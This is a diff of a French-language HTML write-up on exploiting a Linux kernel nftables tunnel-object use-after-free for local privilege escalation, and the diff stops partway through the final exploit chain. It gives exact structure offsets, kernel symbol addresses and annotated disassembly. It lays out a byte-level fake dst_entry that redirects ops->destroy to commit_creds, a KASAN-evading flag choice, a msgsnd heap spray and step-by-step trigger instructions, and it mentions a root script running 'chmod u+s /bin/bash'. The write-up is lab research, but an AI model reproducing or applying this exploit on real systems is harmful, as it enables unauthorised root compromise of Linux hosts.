@@ -65,41 +65,63 @@
   <!-- ============================================================ -->
   <h2><span class="n">02</span> Topographie du noyau</h2><div class="rule"></div>
 
-  <p>Avant de construire quoi que ce soit, il faut cartographier les structures en mémoire. Ces offsets déterminent <i>tout</i> : où poser un faux pointeur, quelle valeur doit être nulle, quel champ contrôle le flux d'exécution.</p>
+  <p>Avant de construire quoi que ce soit, il faut cartographier les structures en mémoire. Ces offsets déterminent <i>tout</i> : où poser un faux pointeur, quelle valeur doit être nulle, quel champ contrôle le flux d'exécution. Chaque offset a été vérifié contre le désassemblage de <code>dst_destroy</code> — pas seulement contre les headers noyau.</p>
 
-  <h3>dst_entry (include/net/dst.h)</h3>
-  <pre><code><span class="cm">// dispositions des champs critiques</span>
-+<span class="ad">0x00</span>  dev          <span class="cm">// net_device*</span>
-+<span class="ad">0x08</span>  ops          <span class="cm">// dst_ops* → contient le pointeur destroy</span>
-+<span class="ad">0x20</span>  xfrm         <span class="cm">// DOIT être 0 sinon dst_destroy suit la chaîne xfrm</span>
-+<span class="ad">0x40</span>  __refcnt     <span class="cm">// atomic_t — dst_release() décrémente ici</span>
-+<span class="ad">0x58</span>  rcu_head     <span class="cm">// utilisé par call_rcu()</span></code></pre>
+  <h3>dst_entry — layout complet (sizeof = 112 = 0x70)</h3>
+  <pre><code><span class="cm">// include/net/dst.h — vérifié contre le désassemblage instruction par instruction</span>
++<span class="ad">0x00</span> (<span class="ad"> 0</span>)  net_device       *dev            <span class="cm">8B  déréférencé APRÈS destroy si ≠ NULL</span>
++<span class="ad">0x08</span> (<span class="ad"> 8</span>)  dst_ops          *ops            <span class="cm">8B  ★ lu AVANT destroy — DOIT pointer vers fake_ops</span>
++<span class="ad">0x10</span> (<span class="ad">16</span>)  unsigned long     _metrics        <span class="cm">8B  pas lu avant destroy → slot ROP libre</span>
++<span class="ad">0x18</span> (<span class="ad">24</span>)  unsigned long     expires         <span class="cm">8B  pas lu avant destroy → slot ROP libre</span>
++<span class="ad">0x20</span> (<span class="ad">32</span>)  xfrm_state       *xfrm           <span class="cm">8B  ★ lu AVANT destroy — DOIT être 0</span>
++<span class="ad">0x28</span> (<span class="ad">40</span>)  int             (*input)(skb)    <span class="cm">8B  pas lu avant destroy → slot libre</span>
++<span class="ad">0x30</span> (<span class="ad">48</span>)  int             (*output)(...)   <span class="cm">8B  pas lu avant destroy → slot libre</span>
++<span class="ad">0x38</span> (<span class="ad">56</span>)  unsigned short    flags           <span class="cm">2B  ★ lu par dst_release — DOIT être 0x0088</span>
++<span class="ad">0x3a</span> (<span class="ad">58</span>)  short             obsolete        <span class="cm">2B</span>
++<span class="ad">0x3c</span> (<span class="ad">60</span>)  unsigned short    header_len      <span class="cm">2B</span>
++<span class="ad">0x3e</span> (<span class="ad">62</span>)  unsigned short    trailer_len     <span class="cm">2B</span>
+<span class="cm">--- frontière cache-line ---</span>
++<span class="ad">0x40</span> (<span class="ad">64</span>)  atomic_t          __refcnt        <span class="cm">4B  ★ décrémenté par dst_release — DOIT être 1</span>
++<span class="ad">0x44</span> (<span class="ad">68</span>)  int               __use           <span class="cm">4B</span>
++<span class="ad">0x48</span> (<span class="ad">72</span>)  unsigned long     lastuse         <span class="cm">8B</span>
++<span class="ad">0x50</span> (<span class="ad">80</span>)  lwtunnel_state   *lwtstate        <span class="cm">8B  déréférencé APRÈS destroy si ≠ NULL</span>
++<span class="ad">0x58</span> (<span class="ad">88</span>)  rcu_head          rcu_head.next   <span class="cm">8B  écrit par call_rcu</span>
++<span class="ad">0x60</span> (<span class="ad">96</span>)  rcu_head          rcu_head.func   <span class="cm">8B  écrit par call_rcu</span>
++<span class="ad">0x68</span> (<span class="ad">104</span>) short             error           <span class="cm">2B</span>
++<span class="ad">0x6a</span> (<span class="ad">106</span>) short             __pad           <span class="cm">2B</span>
++<span class="ad">0x6c</span> (<span class="ad">108</span>) __u32             tclassid        <span class="cm">4B</span>
++<span class="ad">0x70</span> (<span class="ad">112</span>) <span class="cm">-- FIN de dst_entry (112 octets) --</span></code></pre>
 
-  <h3>dst_ops (include/net/dst_ops.h)</h3>
-  <pre><code>+<span class="ad">0x00</span>  family
-+<span class="ad">0x08</span>  gc
-+<span class="ad">0x30</span>  destroy      <span class="cm">// ← le pointeur de fonction qu'on détourne</span></code></pre>
+  <p>Au-delà de +0x70, dans un <code>metadata_dst</code>, on trouve <code>enum metadata_type</code> (4 octets) puis l'union <code>u</code>. Cette information est critique : <code>dst_destroy</code> lit <code>[X+0x70]</code> comme <code>metadata_dst-&gt;type</code> si le flag <code>DST_METADATA</code> est positionné.</p>
 
-  <p>Quand <code>dst_release()</code> décrémente <code>__refcnt</code> à zéro, le noyau appelle <code>call_rcu(&amp;dst->rcu_head, dst_destroy_rcu)</code>. Le callback RCU exécute <code>dst_destroy()</code>, qui lit <code>dst->ops->destroy</code> et l'appelle avec <code>dst</code> en argument :</p>
+  <h3>dst_ops — layout (destroy à +0x30 = +48)</h3>
+  <pre><code><span class="cm">// include/net/dst_ops.h</span>
++<span class="ad">0x00</span>  unsigned short  family          <span class="cm">2B + 2B padding + 4B gc_thresh</span>
++<span class="ad">0x08</span>  void          (*gc)(...)       <span class="cm">8B</span>
++<span class="ad">0x10</span>  dst_entry*    (*check)(...)    <span class="cm">8B</span>
++<span class="ad">0x18</span>  unsigned int  (*default_advmss)  <span class="cm">8B</span>
++<span class="ad">0x20</span>  unsigned int  (*mtu)(...)      <span class="cm">8B</span>
++<span class="ad">0x28</span>  u32*          (*cow_metrics)   <span class="cm">8B</span>
++<span class="ad">0x30</span>  void          (<b>*destroy</b>)(dst*) <span class="cm">8B  ★ LE pointeur qu'on détourne</span>
++<span class="ad">0x38</span>  void          (*ifdown)(...)   <span class="cm">8B</span>
+   ...
++<span class="ad">0x78</span>  kmem_cache    *kmem_cachep     <span class="cm">8B  lu si !DST_METADATA → on l'évite</span>
++<span class="ad">0x80</span>  percpu_counter pcpuc_entries   <span class="cm">★ à ops+128 — hors allocation si fake_ops à X+128</span></code></pre>
 
-  <pre><code><span class="cm">// dst_destroy() — le chemin qui nous donne le contrôle (désassemblé)</span>
-<span class="ad">ffffffff82729b28</span>  <span class="kw">mov</span> 0x8(%rbx),%rbp     <span class="cm">; rbp = dst->ops</span>
-<span class="ad">ffffffff82729b41</span>  <span class="kw">mov</span> 0x30(%rbp),%rax    <span class="cm">; rax = ops->destroy</span>
-<span class="ad">ffffffff82729b48</span>  <span class="kw">je</span>  &lt;skip&gt;             <span class="cm">; saute si NULL</span>
-<span class="ad">ffffffff82729b4a</span>  <span class="kw">mov</span> %rbx,%rdi          <span class="cm">; rdi = &amp;fake_dst (premier argument)</span>
-<span class="ad">ffffffff82729b4d</span>  <span class="kw">call</span> retpoline_rax     <span class="cm">; → appelle notre fonction cible</span></code></pre>
-
-  <p>Si on contrôle <code>ops->destroy</code>, on contrôle <code>rax</code> — et donc l'exécution du noyau.</p>
+  <p>Quand <code>dst_release()</code> décrémente <code>__refcnt</code> à zéro, le noyau appelle <code>call_rcu(&amp;dst->rcu_head, dst_destroy_rcu)</code>. Le callback RCU exécute <code>dst_destroy()</code>, qui lit <code>dst->ops->destroy</code> et l'appelle avec <code>dst</code> en argument.</p>
 
   <h3>Symboles noyau (KASLR=off, 6.1.170-kasan)</h3>
   <table class="tbl">
-    <thead><tr><th>Symbole</th><th>Adresse</th></tr></thead>
+    <thead><tr><th>Symbole</th><th>Adresse</th><th>Rôle</th></tr></thead>
     <tbody>
-      <tr><td><code>commit_creds</code></td><td><code><span class="ad">0xffffffff81233940</span></code></td></tr>
-      <tr><td><code>init_cred</code></td><td><code><span class="ad">0xffffffff83ef2b40</span></code></td></tr>
-      <tr><td><code>call_usermodehelper_exec_work</code></td><td><code><span class="ad">0xffffffff81205670</span></code></td></tr>
-      <tr><td><code>dst_destroy</code></td><td><code><span class="ad">0xffffffff82729aa0</span></code></td></tr>
-      <tr><td><code>modprobe_path</code></td><td><code><span class="ad">0xffffffff83ef63c0</span></code></td></tr>
+      <tr><td><code>commit_creds</code></td><td><code><span class="ad">0xffffffff81233940</span></code></td><td>Cible finale — change uid du processus courant</td></tr>
+      <tr><td><code>init_cred</code></td><td><code><span class="ad">0xffffffff83ef2b40</span></code></td><td>Cred root par défaut</td></tr>
+      <tr><td><code>dst_destroy</code></td><td><code><span class="ad">0xffffffff82729aa0</span></code></td><td>Point d'entrée du callback</td></tr>
+      <tr><td><code>dst_release</code></td><td><code><span class="ad">0xffffffff82729840</span></code></td><td>Déclencheur (décrémente refcnt)</td></tr>
+      <tr><td><code>dst_destroy_rcu</code></td><td><code><span class="ad">0xffffffff82729d30</span></code></td><td>Wrapper RCU (<code>sub rdi,0x58; jmp dst_destroy</code>)</td></tr>
+      <tr><td><code>__x86_indirect_thunk_rax</code></td><td><code><span class="ad">0xffffffff83201580</span></code></td><td>Retpoline pour l'appel indirect</td></tr>
+      <tr><td><code>call_usermodehelper_exec_work</code></td><td><code><span class="ad">0xffffffff81205670</span></code></td><td>Gadget exec_work (abandonné)</td></tr>
+      <tr><td><code>percpu_counter_add_batch</code></td><td><code><span class="ad">0xffffffff81feb1a0</span></code></td><td>Piège si DST_NOCOUNT absent</td></tr>
     </tbody>
   </table>
 
@@ -113,6 +135,8 @@
       <tr><td>VM</td><td>QEMU/KVM, Debian 12</td><td>Environnement jetable, snapshots</td></tr>
       <tr><td>KASLR</td><td>Désactivé</td><td>Développement — adresses statiques pour itérer</td></tr>
       <tr><td>CONFIG_RANDSTRUCT</td><td>NONE</td><td>Dispositions de structures prévisibles</td></tr>
+      <tr><td>CONFIG_KASAN_INLINE</td><td>y</td><td>Vérifications shadow inlinées dans le code machine</td></tr>
+      <tr><td>CONFIG_XFRM</td><td>y</td><td>Active le champ <code>xfrm</code> dans <code>dst_entry</code> (+0x20)</td></tr>
       <tr><td>Accès</td><td><code>unshare(CLONE_NEWUSER|CLONE_NEWNET)</code></td><td>Pas de sudo nécessaire — user+net namespaces</td></tr>
     </tbody>
   </table>
@@ -136,7 +160,7 @@
     <div class="step"><code>call_usermodehelper_exec_work</code> exécute <code>/tmp/lpe_root.sh</code> en root → <code>chmod u+s /bin/bash</code>.</div>
   </div>
 
-  <p>Ce plan ne marchera pas. Voici pourquoi.</p>
+  <p>Ce plan ne marchera pas. Voici les quatre murs contre lesquels il s'est écrasé.</p>
 
   <div class="note warn">
     <span class="lbl">Impasse #1 — Constantes NFTA_ erronées</span>
@@ -144,13 +168,28 @@
   </div>
 
   <div class="note warn">
-    <span class="lbl">Impasse #2 — Mauvaise méthode de spray</span>
-    Le spray initial utilisait <code>pipe write()</code>, qui stocke les données dans le <b>page cache</b> (pages de 4 Ko), pas dans <code>kmalloc-256</code>. La zone libérée n'était jamais remplie par nos données contrôlées. Correction : basculer vers <code>msgsnd()</code> avec un corps de 208 octets — <code>kmalloc(sizeof(msg_msg) + 208, GFP_KERNEL_ACCOUNT)</code> = 256 octets → même slab que <code>metadata_dst</code>.
+    <span class="lbl">Impasse #2 — setxattr silencieusement mort</span>
+    Le tout premier spray utilisait <code>setxattr()</code> pour écrire dans des slabs noyau. Problème : le filesystem de <code>/tmp</code> était <b>tmpfs</b>, qui ne supporte pas les attributs étendus. Chaque appel retournait <code>EOPNOTSUPP</code> — le spray échouait silencieusement, la zone libérée n'était jamais remplie.
+    <br><br>
+    <b>Deuxième tentative</b> : basculer vers <code>pipe write()</code>. Mais les données pipe sont stockées dans le <b>page cache</b> (pages de 4 Ko), pas dans <code>kmalloc-256</code>. Mauvais allocateur encore.
+    <br><br>
+    <b>Correction finale</b> : <code>msgsnd()</code> avec un corps de 208 octets — <code>kmalloc(sizeof(msg_msg) + 208, GFP_KERNEL_ACCOUNT)</code> = 256 octets → même slab que <code>metadata_dst</code>.
+  </div>
+
+  <div class="note warn">
+    <span class="lbl">Impasse #3 — Alignement subprocess_info</span>
+    La disposition de <code>fake_dst</code> supposait <code>path</code> à l'offset +32. La vraie structure <code>subprocess_info</code> du noyau a un <code>work_struct</code> de 32 octets en tête, suivi de <code>complete</code> à +32, puis <code>path</code> à <b>+40</b>, <code>argv</code> à +48, <code>wait</code> à +64. Chaque champ était décalé de 8 octets. Vérification post-mortem avec <code>offsetof()</code> :
+<pre><code><span class="cm">// avant (faux)             après (corrigé)</span>
+path_ptr  @ +<span class="ad">32</span>  <span class="cm">✗</span>       path_ptr  @ +<span class="ad">40</span>  <span class="cm">✓</span>
+argv_ptr  @ +<span class="ad">40</span>  <span class="cm">✗</span>       argv_ptr  @ +<span class="ad">48</span>  <span class="cm">✓</span>
+envp_ptr  @ +<span class="ad">48</span>  <span class="cm">✗</span>       envp_ptr  @ +<span class="ad">56</span>  <span class="cm">✓</span>
+wait      @ +<span class="ad">56</span>  <span class="cm">✗</span>       wait      @ +<span class="ad">64</span>  <span class="cm">✓</span></code></pre>
+    Même après correction, l'approche <code>exec_work</code> restera bloquée — mais ce décalage a masqué la vraie raison de l'échec pendant un cycle entier de développement.
   </div>
 
   <div class="note danger">
-    <span class="lbl">Impasse #3 — path=NULL (fatale)</span>
-    Après correction des deux premiers bugs, le spray fonctionne et le TUN draine les paquets. Mais le script n'est jamais exécuté. Cause : le champ <code>msg->security</code> (offset 40 dans <code>msg_mm</code>) est fixé par les hooks LSM du noyau, <b>pas par le payload userspace</b>. Il est toujours <code>NULL</code>. Or <code>subprocess_info->path</code> est lu au même offset. Résultat : <code>kernel_execve(NULL)</code> → <code>-EFAULT</code>. Le kthread gagne brièvement root mais ne peut rien exécuter.
+    <span class="lbl">Impasse #4 — path=NULL (fatale)</span>
+    Après correction des trois bugs précédents, le spray fonctionne et le TUN draine les paquets. Mais le script n'est jamais exécuté. Cause : le champ <code>msg->security</code> (offset 40 dans <code>msg_mm</code>) est fixé par les hooks LSM du noyau, <b>pas par le payload userspace</b>. Il est toujours <code>NULL</code>. Or <code>subprocess_info->path</code> est lu au même offset. Résultat : <code>kernel_execve(NULL)</code> → <code>-EFAULT</code>. Le kthread gagne brièvement root mais ne peut rien exécuter.
     <br><br>
     <b>Tentative de contournement</b> : basculer vers <code>user_key_payload</code> (<code>add_key()</code>) qui contrôle cet offset. Mais le quota de clés limite à ~96 créations sur 512 demandées — couverture de spray insuffisante. Impasse confirmée.
   </div>
@@ -230,29 +269,173 @@
   </div>
 
   <!-- ============================================================ -->
-  <h2><span class="n">07</span> Chaîne d'exploitation finale</h2><div class="rule"></div>
+  <h2><span class="n">07</span> Anatomie de dst_destroy</h2><div class="rule"></div>
+
+  <p>Pour construire un faux objet qui survive au parcours de <code>dst_destroy</code> sans crasher, il faut tracer <b>chaque accès mémoire</b> entre l'entrée de la fonction et l'appel indirect <code>ops->destroy(dst)</code>. J'ai désassemblé les 194 octets de <code>dst_destroy</code> (<code><span class="ad">0xffffffff82729aa0</span></code>) et annoté chaque lecture de champ avec sa contrainte.</p>
+
+  <h3>Le chemin critique : de l'entrée au call</h3>
+
+  <pre><code><span class="cm">// rbx = X (pointeur vers notre fake dst_entry) tout au long</span>
+
+<span class="cm">--- BLOC A : vérification KASAN inline pour X+0x20 (xfrm) ---</span>
+<span class="ad">82729aae</span>  <span class="kw">movabs</span> rax, <span class="ad">0xdffffc0000000000</span>    <span class="cm">; base shadow KASAN</span>
+<span class="ad">82729ab8</span>  <span class="kw">add</span>    rdi, 0x20                <span class="cm">; rdi = X+32</span>
+<span class="ad">82729abf</span>  <span class="kw">shr</span>    rdx, 3                   <span class="cm">; shadow_addr = (X+32) >> 3</span>
+<span class="ad">82729ac3</span>  <span class="kw">cmp</span>    byte ptr [rdx+rax], 0    <span class="cm">; shadow == 0 ? (oui, dans notre alloc)</span>
+<span class="ad">82729ac7</span>  <span class="kw">jne</span>    __asan_report_load8      <span class="cm">; non pris</span>
+
+<span class="cm">--- LECTURE #1 : dst->xfrm à [X+0x20] ---</span>
+<span class="ad">82729acd</span>  <span class="kw">mov</span>    r12, [rbx + 0x20]        <span class="cm">; r12 = xfrm</span>
+<span class="ad">82729ad1</span>  <span class="kw">test</span>   r12, r12
+<span class="ad">82729ad4</span>  <span class="kw">je</span>     BLOC_C                   <span class="cm">; si xfrm == NULL → saute le bloc XFRM</span>
+
+<span class="cm">--- BLOC B (si xfrm ≠ NULL) : lit xdst->child à [X+0xF0] ---</span>
+<span class="ad">82729af8</span>  <span class="kw">mov</span>    r12, [rbx + 0xf0]        <span class="cm">; r12 ÉCRASÉ avec child = [X+240]</span>
+                                          <span class="cm">; X+240 est DANS notre alloc de 256 octets</span>
+
+<span class="cm">--- BLOC C : lecture de ops ---</span>
+<span class="ad">82729b1e</span>  <span class="cm">[vérif KASAN pour X+8]</span>
+<span class="ad">82729b28</span>  <span class="kw">mov</span>    rbp, [rbx + 8]           <span class="cm">; rbp = ops (notre fake_ops à X+128)</span>
+
+<span class="cm">--- BLOC D : lecture de ops->destroy ---</span>
+<span class="ad">82729b2c</span>  <span class="kw">lea</span>    rdi, [rbp + 0x30]        <span class="cm">; &amp;ops->destroy = X+128+48 = X+176</span>
+<span class="ad">82729b37</span>  <span class="cm">[vérif KASAN pour ops+48 → shadow(X+176) == 0 ✓]</span>
+<span class="ad">82729b41</span>  <span class="kw">mov</span>    rax, [rbp + 0x30]        <span class="cm">; rax = destroy = commit_creds</span>
+<span class="ad">82729b45</span>  <span class="kw">test</span>   rax, rax
+<span class="ad">82729b48</span>  <span class="kw">je</span>     skip                     <span class="cm">; non pris (rax ≠ 0)</span>
+
+<span class="cm">=====================================================</span>
+<span class="cm">=  L'APPEL : ops->destroy(dst)                     =</span>
+<span class="cm">=====================================================</span>
+<span class="ad">82729b4a</span>  <span class="kw">mov</span>    rdi, rbx                 <span class="cm">; rdi = X (argument)</span>
+<span class="ad">82729b4d</span>  <span class="kw">call</span>   __x86_indirect_thunk_rax <span class="cm">; CALL rax = commit_creds(X)</span></code></pre>
+
+  <p>Quatre lectures seulement avant le call : <code>[X+32]</code>, éventuellement <code>[X+240]</code>, <code>[X+8]</code>, et <code>[X+176]</code>. Tout le reste du buffer de 256 octets est <b>libre</b> pour les données d'exploit.</p>
+
+  <h3>Ce qui se passe APRÈS le call (si commit_creds retourne)</h3>
+
+  <p><code>commit_creds()</code> retourne normalement (c'est une vraie fonction du noyau, pas un gadget qui pivote la pile). Donc le code <i>après</i> <code>82729b4d</code> s'exécute aussi, et il lit :</p>
+
+  <table class="tbl">
+    <thead><tr><th>Offset</th><th>Champ</th><th>Contrainte post-retour</th></tr></thead>
+    <tbody>
+      <tr><td><code>X+0</code></td><td><code>dev</code></td><td>Si ≠ 0 → déréférence <code>dev+0x4C8</code> → crash. <b>Doit être 0.</b></td></tr>
+      <tr><td><code>X+80</code></td><td><code>lwtstate</code></td><td>Si ≠ 0 → <code>lock dec [lwtstate+8]</code> → crash. <b>Doit être 0.</b></td></tr>
+      <tr><td><code>X+56</code></td><td><code>flags</code></td><td>Test du bit <code>DST_METADATA</code> (0x80). Si positionné → lit <code>[X+112]</code> comme <code>metadata_type</code>.</td></tr>
+      <tr><td><code>X+112</code></td><td><code>md_type</code></td><td>Si flags a DST_METADATA et type == 0 → appelle <code>dst_cache_destroy(&amp;X[0xB8])</code>.</td></tr>
+    </tbody>
+  </table>
+
+  <h3>État des registres au moment du call</h3>
+  <pre><code><span class="cm">// registres quand le retpoline exécute rax (commit_creds) :</span>
+<span class="kw">rdi</span> = X           <span class="cm">; premier argument (le fake dst = notre msg_mm)</span>
+<span class="kw">rbx</span> = X           <span class="cm">; sauvegardé, identique</span>
+<span class="kw">rbp</span> = X+128       <span class="cm">; pointe vers fake_ops (= [X+8])</span>
+<span class="kw">r12</span> = 0           <span class="cm">; child = NULL (parce que xfrm == NULL à X+32)</span>
+<span class="kw">r13</span> = X+8         <span class="cm">; &amp;dst->ops</span>
+<span class="kw">rax</span> = <span class="ad">0xffffffff81233940</span>  <span class="cm">; commit_creds</span>
+<span class="kw">rsp</span> = pile noyau  <span class="cm">; retour → 82729b52 (code post-destroy)</span></code></pre>
+
+  <div class="note">
+    <span class="lbl">Observation</span>
+    Si <code>xfrm</code> (X+32) est non nul, le bloc B s'exécute et lit <code>[X+240]</code> comme <code>xdst->child</code>, <b>écrasant r12</b>. Le commentaire initial dans mes notes disait « r12 = gadget pivot » — c'était faux. r12 = <code>[X+240]</code>, pas <code>[X+32]</code>. Le fix : mettre xfrm = 0, r12 reste à 0, le bloc B est sauté entièrement.
+  </div>
+
+  <!-- ============================================================ -->
+  <h2><span class="n">08</span> Carte mémoire du faux objet</h2><div class="rule"></div>
+
+  <p>Le résultat de l'analyse : un buffer de 256 octets (<code>kmalloc-cg-256</code>) où chaque octet a une contrainte documentée. Les champs marqués <b>★</b> sont lus par <code>dst_destroy</code> ou <code>dst_release</code> <i>avant</i> l'appel à <code>ops->destroy</code> — toute erreur ici crashe le noyau avant même d'atteindre le gadget.</p>
+
+  <pre><code><span class="cm">// 256 octets @ adresse X — allocation kmalloc-cg-256</span>
+<span class="cm">// ── dst_entry (112 octets) ─────────────────────────────────────</span>
+X+<span class="ad">  0</span>  <span class="ad">00 00 00 00 00 00 00 00</span>  <span class="cm">dev = NULL (crash si ≠ 0 post-retour)</span>
+X+<span class="ad">  8</span>  <span class="ad">[  X+128 en little-end  ]</span>  <span class="cm">★ ops → fake_ops intégré à X+128</span>
+X+<span class="ad"> 16</span>  <span class="ad">[  libre : slot ROP #0  ]</span>  <span class="cm">_metrics — pas lu avant destroy</span>
+X+<span class="ad"> 24</span>  <span class="ad">[  libre : slot ROP #1  ]</span>  <span class="cm">expires — pas lu avant destroy</span>
+X+<span class="ad"> 32</span>  <span class="ad">00 00 00 00 00 00 00 00</span>  <span class="cm">★ xfrm = NULL (sinon lit X+240, écrase r12)</span>
+X+<span class="ad"> 40</span>  <span class="ad">[  libre : slot ROP #2  ]</span>  <span class="cm">input — pas lu avant destroy</span>
+X+<span class="ad"> 48</span>  <span class="ad">[  libre : slot ROP #3  ]</span>  <span class="cm">output — pas lu avant destroy</span>
+X+<span class="ad"> 56</span>  <span class="ad">88 00</span>                      <span class="cm">★ flags = DST_NOCOUNT|DST_METADATA (0x0088)</span>
+X+<span class="ad"> 58</span>  <span class="ad">00 00 00 00 00 00</span>          <span class="cm">obsolete + header_len + trailer_len</span>
+X+<span class="ad"> 64</span>  <span class="ad">01 00 00 00</span>              <span class="cm">★ __refcnt = 1 (dst_release → 0 → callback)</span>
+X+<span class="ad"> 68</span>  <span class="ad">00 00 00 00</span>              <span class="cm">__use</span>
+X+<span class="ad"> 72</span>  <span class="ad">00 00 00 00 00 00 00 00</span>  <span class="cm">lastuse</span>
+X+<span class="ad"> 80</span>  <span class="ad">00 00 00 00 00 00 00 00</span>  <span class="cm">lwtstate = NULL (crash si ≠ 0 post-retour)</span>
+X+<span class="ad"> 88</span>  <span class="ad">[  écrit par call_rcu   ]</span>  <span class="cm">rcu_head.next</span>
+X+<span class="ad"> 96</span>  <span class="ad">[  écrit par call_rcu   ]</span>  <span class="cm">rcu_head.func</span>
+X+<span class="ad">104</span>  <span class="ad">00 00 00 00 00 00 00 00</span>  <span class="cm">error + __pad + tclassid</span>
+X+<span class="ad">112</span>  <span class="ad">00 00 00 00</span>              <span class="cm">metadata_type = 0 (si DST_METADATA)</span>
+<span class="cm">// ── padding (12 octets) ───────────────────────────────────────</span>
+X+<span class="ad">116</span>  <span class="ad">00 .. 00</span>                  <span class="cm">12 octets libres avant fake_ops</span>
+<span class="cm">// ── fake dst_ops (128 octets) ─────────────────────────────────</span>
+X+<span class="ad">128</span>  <span class="ad">00 00 00 00 00 00 00 00</span>  <span class="cm">family=0, gc_thresh=0</span>
+X+<span class="ad">136</span>  <span class="ad">00 00 00 00 00 00 00 00</span>  <span class="cm">gc = NULL</span>
+X+<span class="ad">144</span>  <span class="ad">00 00 00 00 00 00 00 00</span>  <span class="cm">check = NULL</span>
+X+<span class="ad">152</span>  <span class="ad">00 00 00 00 00 00 00 00</span>  <span class="cm">default_advmss = NULL</span>
+X+<span class="ad">160</span>  <span class="ad">00 00 00 00 00 00 00 00</span>  <span class="cm">mtu = NULL</span>
+X+<span class="ad">168</span>  <span class="ad">00 00 00 00 00 00 00 00</span>  <span class="cm">cow_metrics = NULL</span>
+X+<span class="ad">176</span>  <span class="ad">[  commit_creds addr   ]</span>  <span class="cm">★ ops->destroy = 0xffffffff81233940</span>
+X+<span class="ad">184</span>  <span class="ad">00 00 00 00 00 00 00 00</span>  <span class="cm">ifdown = NULL</span>
+  ...                               <span class="cm">(negative_advice..redirect = NULL)</span>
+X+<span class="ad">240</span>  <span class="ad">00 00 00 00 00 00 00 00</span>  <span class="cm">confirm_neigh = NULL (aussi xdst->child)</span>
+X+<span class="ad">248</span>  <span class="ad">00 00 00 00 00 00 00 00</span>  <span class="cm">kmem_cachep = NULL (jamais lu : DST_METADATA)</span>
+<span class="cm">// ── X+256 = FIN de l'allocation ───────────────────────────────</span>
+<span class="cm">// Au-delà : redzone KASAN (shadow = 0xfc). Jamais atteint</span>
+<span class="cm">// grâce à DST_NOCOUNT qui empêche percpu_counter_add_batch.</span></code></pre>
+
+  <div class="note warn">
+    <span class="lbl">Le piège DST_NOCOUNT</span>
+    Sans le flag <code>DST_NOCOUNT</code> (bit 3, valeur <code>0x0008</code>), <code>dst_release</code> appelle <code>dst_entries_add(ops, -1)</code> <b>avant</b> d'atteindre <code>dst_destroy</code>. Cette fonction exécute <code>percpu_counter_add_batch(&amp;ops->pcpuc_entries, -1, 32)</code> — or <code>pcpuc_entries</code> est à <code>ops+0x80</code> = <code>X+128+128</code> = <code>X+256</code>. C'est le <b>premier octet après</b> notre allocation de 256 octets : en KASAN, c'est la redzone (shadow byte = <code>0xFC</code>). Résultat : <code>__asan_report_load8</code> → panic. Le flag <code>DST_NOCOUNT</code> saute l'appel à <code>dst_entries_add</code> et évite le crash.
+    <br><br>
+    Flags corrects : <code>0x0088</code> = <code>DST_NOCOUNT</code> (0x0008) | <code>DST_METADATA</code> (0x0080).
+  </div>
+
+  <!-- ============================================================ -->
+  <h2><span class="n">09</span> La chaîne de déclenchement</h2><div class="rule"></div>
+
+  <p>Le chemin du trigger — de la lecture TUN jusqu'au <code>call rax</code> — traverse trois fonctions. Chacune a ses propres vérifications KASAN et ses propres contraintes sur le faux objet.</p>
+
+  <div class="steps">
+    <div class="step"><b><code>dst_release</code></b> (<code><span class="ad">0xffffffff82729840</span></code>) : vérifie KASAN sur X+64 (shadow OK), puis <code>lock xadd [X+0x40], -1</code> → refcnt passe de 1 à 0. Lit <code>[X+56]</code> (flags). Si <code>DST_NOCOUNT</code> → saute <code>dst_entries_add</code>. Appelle <code>call_rcu(&amp;X[0x58], dst_destroy_rcu)</code>.</div>
+    <div class="step"><b><code>dst_destroy_rcu</code></b> (<code><span class="ad">0xffffffff82729d30</span></code>) : <code>sub rdi, 0x58</code> → <code>container_of(head, dst_entry, rcu_head)</code>. Confirme que <code>rcu_head</code> est à X+88 dans <code>dst_entry</code>. Tail-call vers <code>dst_destroy</code>.</div>
+    <div class="step"><b><code>dst_destroy</code></b> (<code><span class="ad">0xffffffff82729aa0</span></code>) : lit xfrm → NULL → skip. Lit ops → X+128. Lit <code>[X+176]</code> = commit_creds. <code>mov rdi, rbx; call rax</code> → <b>contrôle du flux d'exécution</b>.</div>
+  </div>
+
+  <p class="small">Il existe aussi <code>dst_release_immediate</code> qui suit le même chemin sans le callback RCU — elle appelle <code>dst_destroy</code> directement. Dans les deux cas, <code>DST_NOCOUNT</code> est indispensable pour éviter le crash à <code>X+256</code>.</p>
+
+  <!-- ============================================================ -->
+  <h2><span class="n">10</span> Chaîne d'exploitation finale</h2><div class="rule"></div>
 
   <div class="steps">
     <div class="step"><b>Namespaces</b> : <code>unshare(CLONE_NEWUSER | CLONE_NEWNET)</code> — aucun sudo nécessaire. Mapping uid/gid via <code>/proc/self/uid_map</code>.</div>
     <div class="step"><b>TUN device</b> : ouvrir <code>/dev/net/tun</code>, configurer <code>tun0</code> (10.0.0.1/24), l'activer, ajouter une route vers 10.0.0.0/24.</div>
-    <div class="step"><b>NEWTABLE + NEWOBJ</b> : créer une table NFT <code>NFPROTO_NETDEV</code> et un objet tunnel (family=5, type=<code>NFT_OBJECT_TUNNEL</code>=6). L'allocation de <code>metadata_dst</code> a lieu ici : 208 octets → <code>kmalloc-cg-256</code>.</div>
+    <div class="step"><b>NEWTABLE + NEWOBJ</b> : créer une table NFT <code>NFPROTO_NETDEV</code> (family=5) et un objet tunnel (<code>NFT_OBJECT_TUNNEL</code>=6). L'allocation de <code>metadata_dst</code> a lieu ici : 208 octets → <code>kmalloc-cg-256</code>.</div>
     <div class="step"><b>NEWCHAIN + NEWRULE</b> : chaîne NETDEV avec hook <code>NF_NETDEV_EGRESS</code> sur <code>tun0</code>. Règle : expression <code>objref</code> (charge l'objet tunnel → appelle <code>nft_tunnel_obj_eval()</code> → <code>dst_hold</code> + <code>skb_dst_set</code>).</div>
     <div class="step"><b>Paquet déclencheur</b> : <code>sendto()</code> un datagramme UDP vers 10.0.0.2:9999 — le hook EGRESS l'évalue, attache le <code>metadata_dst</code> au SKB, et le TUN le parke dans son anneau.</div>
     <div class="step"><b>DELTABLE</b> : suppression en cascade de la table → <code>nft_tunnel_obj_destroy()</code> → <code>kfree(metadata_dst)</code>. <b>Le UAF est ouvert.</b></div>
     <div class="step"><b>Drainage de quarantaine</b> : ~700 000 cycles <code>msgsnd</code>/<code>msgrcv</code> pour vider la quarantaine KASAN et rendre la zone réallocable.</div>
-    <div class="step"><b>Spray</b> : 512 messages <code>msg_mm</code> (8 queues × 64 messages) dans <code>kmalloc-cg-256</code>. Chaque message contient l'adresse de <code>commit_creds</code> répétée dans les champs critiques.</div>
